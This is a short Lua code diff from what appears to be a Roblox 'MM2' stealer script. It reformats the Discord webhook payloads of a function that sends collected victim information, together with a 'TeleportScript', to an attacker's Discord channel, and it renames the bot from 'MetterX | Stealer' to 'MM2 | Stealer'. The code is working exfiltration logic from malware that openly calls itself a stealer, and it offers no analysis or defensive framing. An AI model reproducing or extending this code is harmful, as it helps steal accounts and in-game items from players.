@@ -65,30 +65,31 @@ function SendMessageEMBED(url, embed, bool)
     local headers = {
         ["Content-Type"] = "application/json"
     }
-    local data = {
-        username = "MetterX | Stealer",
-        avatar_url = "https://cdn.discordapp.com/attachments/1292386513363144726/1295553746130174012/Photoroom-20240808_210138.png?ex=67203573&is=671ee3f3&hm=7d3bd0a97d3ef925f50a86ab0a37ca5388c74425a80d0970ab70039e46b9d860&",
-        ["content"] = " " .. TeleportScript .. " ",
-        ["embeds"] = {
-            {
-                ["title"] = embed.title,
-                ["color"] = embed.color,
-                ["fields"] = embed.fields,
-            }
+   local data = {
+    username = "MM2 | Stealer",
+    avatar_url = "https://cdn.discordapp.com/attachments/1292386513363144726/1295553746130174012/Photoroom-20240808_210138.png?ex=67203573&is=671ee3f3&hm=7d3bd0a97d3ef925f50a86ab0a37ca5388c74425a80d0970ab70039e46b9d860&",
+    content = TeleportScript,
+    embeds = {
+        {
+            title = embed.title,
+            color = embed.color,
+            fields = embed.fields,
         }
     }
-    local data2 = {
-        username = "MetterX | Stealer", 
-        avatar_url = "https://cdn.discordapp.com/attachments/1292386513363144726/1295553746130174012/Photoroom-20240808_210138.png?ex=67203573&is=671ee3f3&hm=7d3bd0a97d3ef925f50a86ab0a37ca5388c74425a80d0970ab70039e46b9d860&", 
-        ["content"] = "--@everyone\n " .. TeleportScript .. " ",
-        ["embeds"] = {
-            {
-                ["title"] = embed.title,
-                ["color"] = embed.color,
-                ["fields"] = embed.fields,
-            }
+}
+
+local data2 = {
+    username = "MM2 | Stealer", 
+    avatar_url = "https://cdn.discordapp.com/attachments/1292386513363144726/1295553746130174012/Photoroom-20240808_210138.png?ex=67203573&is=671ee3f3&hm=7d3bd0a97d3ef925f50a86ab0a37ca5388c74425a80d0970ab70039e46b9d860&", 
+    content = "--@everyone\n" .. TeleportScript,
+    embeds = {
+        {
+            title = embed.title,
+            color = embed.color,
+            fields = embed.fields,
         }
     }
+}
     local body = http:JSONEncode(data)
     local body2 = http:JSONEncode(data2)
     
